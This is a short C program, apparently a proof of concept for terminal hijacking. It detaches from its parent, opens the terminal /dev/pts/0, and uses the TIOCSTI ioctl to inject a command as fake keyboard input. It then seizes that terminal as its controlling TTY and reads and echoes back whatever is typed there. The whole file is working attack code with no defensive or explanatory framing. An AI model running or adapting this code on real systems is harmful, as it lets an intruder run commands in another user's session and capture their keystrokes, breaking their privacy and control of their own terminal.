#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <termios.h>
#include <sys/ioctl.h>
#include <signal.h>

#define HIJACKED_TTY "/dev/pts/0"
#define NOT_INPUT_CMD "tail -f /dev/null"

void fake_input(int tty, char* cmd) {
  unsigned int i = 0;
  while(cmd[i]) {
    ioctl(tty, TIOCSTI, cmd + i);
    i ++;
  }
  ioctl(tty, TIOCSTI, "\n");
}

int main(void) {

  pid_t tty_sid;

  switch(fork()) {
    case -1:
      perror("fork ");
      return 1;
    case 0:
      break;
    default:
      exit(0);
    }

  if(setsid() == -1) {
    perror("setsid ");
    return 1;
  }

  int tty = open(HIJACKED_TTY, O_RDWR);
  if(tty < 0) {
    perror("open ");
    return 1;
  }

  fake_input(tty, NOT_INPUT_CMD);

  if(ioctl(tty, TIOCSCTTY, 1)) {
    perror("ioctl TIOCSCTTY ");
    return 1;
  }

  close(0); close(1); close(2);
  dup(tty); dup(tty); dup(tty);

  /*if(ioctl(tty, TIOCEXCL)) {
    perror("tty TIOCEXCL ");
    return 1;
  }*/

  if(ioctl(tty, TIOCGSID, &tty_sid)) {
    perror("ioctl TIOCGSID ");
    return 1;
  }
  printf("tty %s sid: %d\n", HIJACKED_TTY, tty_sid);

  char buff[500];
  while(fgets(buff, 500, stdin)) {
    printf("received -> %s", buff);
  }

  close(tty);

  return 0;
}
